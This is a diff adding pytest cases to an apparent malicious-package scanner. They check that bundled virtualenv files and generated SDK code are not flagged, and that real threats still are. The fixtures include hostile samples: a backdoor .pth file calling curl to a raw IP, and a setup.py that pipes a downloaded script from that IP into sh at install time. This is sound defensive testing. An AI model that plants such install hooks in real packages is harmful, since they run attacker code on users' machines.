@@ -460,6 +460,114 @@ def test_package_with_bundled_native_binary_detected():
     assert report.has_bundled_binary is True
 
 
+def test_bundled_virtualenv_in_sdist_is_not_scanned_as_package_code():
+    """Real case: google-form-api 0.1.0 shipped its whole venv/ in the sdist.
+    virtualenv's / setuptools' stock _virtualenv.pth and distutils-precedence.pth,
+    the activate_this.py shim, and console-script *.exe launchers must not be
+    treated as first-party code — on their own they scored the package MALICIOUS.
+    """
+    tar_bytes = _make_tarball({
+        "pkg-0.1.0/src/pkg/__init__.py": "from .main import Thing\n",
+        "pkg-0.1.0/src/pkg/main.py": "class Thing:\n    def go(self):\n        return 1\n",
+        "pkg-0.1.0/venv/pyvenv.cfg": "home = /usr/bin\nversion = 3.10.6\n",
+        "pkg-0.1.0/venv/Lib/site-packages/_virtualenv.pth": "import _virtualenv\n",
+        "pkg-0.1.0/venv/Lib/site-packages/distutils-precedence.pth": (
+            "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; "
+            "enabled and __import__('_distutils_hack').add_shim();\n"
+        ),
+        "pkg-0.1.0/venv/Scripts/activate_this.py": "import os\nos.environ['PATH'] = os.pathsep.join(['x'])\n",
+        "pkg-0.1.0/venv/Scripts/normalizer.exe": b"PK\x03\x04bundled-console-script-shim",
+    })
+    report = analyze_python_package_tarball(tar_bytes, "pkg")
+    assert report.flags == []
+    assert report.has_pth_execution is False
+    assert report.has_bundled_binary is False
+    assert report.verdict == ThreatVerdict.BENIGN_COMMUNITY
+
+
+def test_bundled_env_exclusion_still_flags_a_real_pth_at_package_root():
+    """The venv guard must not mask a malicious .pth that lives in the package
+    proper rather than inside the bundled environment."""
+    tar_bytes = _make_tarball({
+        "pkg-1.0.0/pkg/__init__.py": "pass\n",
+        "pkg-1.0.0/venv/pyvenv.cfg": "home = /usr/bin\n",
+        "pkg-1.0.0/venv/Lib/site-packages/_virtualenv.pth": "import _virtualenv\n",
+        "pkg-1.0.0/backdoor.pth": "import os, subprocess; subprocess.Popen(['curl', 'http://185.220.101.5/x'])\n",
+    })
+    report = analyze_python_package_tarball(tar_bytes, "pkg")
+    assert any("PYTHON_PTH_CODE_EXECUTION" in f for f in report.flags)
+    assert report.has_pth_execution is True
+    assert report.verdict == ThreatVerdict.MALICIOUS
+
+
+def test_bundled_env_with_nonstandard_name_detected_via_pyvenv_cfg():
+    """A venv dir that isn't literally named venv/.venv is still excluded when it
+    carries a pyvenv.cfg marker."""
+    tar_bytes = _make_tarball({
+        "pkg-1.0.0/pkg/__init__.py": "from .main import Thing\n",
+        "pkg-1.0.0/pkg/main.py": "class Thing:\n    def go(self):\n        return 1\n",
+        "pkg-1.0.0/.env-py310/pyvenv.cfg": "home = /usr/bin\n",
+        "pkg-1.0.0/.env-py310/lib/site-packages/evil.pth": "import os; os.system('id')\n",
+        "pkg-1.0.0/.env-py310/bin/tool": b"\x7fELF\x02\x01\x01\x00",
+    })
+    report = analyze_python_package_tarball(tar_bytes, "pkg")
+    assert report.flags == []
+    assert report.has_pth_execution is False
+    assert report.verdict == ThreatVerdict.BENIGN_COMMUNITY
+
+
+def test_generated_sdk_tarball_not_flagged_on_boilerplate():
+    """Real case: google-workspace-sdk 0.0.1, a Stainless-generated client whose
+    `environment_1` endpoint constant is `http://3.18.135.213:5001`. The raw-IP
+    "exfiltration destination" + os.environ reads are generator boilerplate."""
+    banner = "# File generated from our OpenAPI spec by Stainless. See CONTRIBUTING.md for details.\n"
+    tar_bytes = _make_tarball({
+        "acme-sdk-0.0.1/pyproject.toml": '[project]\nname = "acme-sdk"\nversion = "0.0.1"\n',
+        "acme-sdk-0.0.1/src/acme_sdk/__init__.py": "from ._client import AcmeSDK\n",
+        "acme-sdk-0.0.1/src/acme_sdk/_client.py": (
+            banner + "import os\n"
+            "ENVIRONMENTS = {\n"
+            '    "production": "http://localhost:5001",\n'
+            '    "environment_1": "http://3.18.135.213:5001",\n'
+            "}\n"
+            "class AcmeSDK:\n"
+            "    def __init__(self, api_key=None):\n"
+            '        self.api_key = api_key or os.environ.get("ACME_SDK_API_KEY")\n'
+        ),
+        # verbatim-copied internal file: no per-file banner
+        "acme-sdk-0.0.1/src/acme_sdk/_models.py": (
+            "import os\n"
+            'DEFER = os.environ.get("DEFER_PYDANTIC_BUILD", "true")\n'
+            "class BaseModel:\n    pass\n"
+        ),
+        "acme-sdk-0.0.1/src/acme_sdk/_extra1.py": "x = 1\n",
+        "acme-sdk-0.0.1/src/acme_sdk/_extra2.py": "x = 2\n",
+        "acme-sdk-0.0.1/src/acme_sdk/_extra3.py": "x = 3\n",
+        "acme-sdk-0.0.1/src/acme_sdk/_extra4.py": "x = 4\n",
+    })
+    report = analyze_python_package_tarball(tar_bytes, "acme-sdk")
+    assert not any("EXFILTRATION_DESTINATION_DETECTED" in f for f in report.flags)
+    assert not any("SOURCE_CODE_ENV_VARS_ACCESS" in f for f in report.flags)
+    assert report.verdict == ThreatVerdict.BENIGN_COMMUNITY
+
+
+def test_root_pyvenv_cfg_does_not_suppress_scanning_of_the_package():
+    """Evasion guard: a lone pyvenv.cfg dropped next to setup.py must not get the
+    package itself treated as a bundled environment and skipped."""
+    tar_bytes = _make_tarball({
+        "evilpkg-1.0.0/pyvenv.cfg": "home = /usr/bin\n",
+        "evilpkg-1.0.0/setup.py": (
+            "from setuptools import setup\n"
+            "import os\n"
+            "os.system('curl http://185.220.101.5/x.sh | sh')\n"
+            "setup(name='evilpkg', version='1.0.0')\n"
+        ),
+    })
+    report = analyze_python_package_tarball(tar_bytes, "evilpkg")
+    assert any("INSTALL_TIME_EXECUTION" in f for f in report.flags)
+    assert report.verdict in (ThreatVerdict.SUSPICIOUS, ThreatVerdict.MALICIOUS)
+
+
 def test_npm_source_discord_webhook_and_env_vars_is_confirmed_stealer():
     tar_bytes = _make_tarball({
         "package/index.js": (
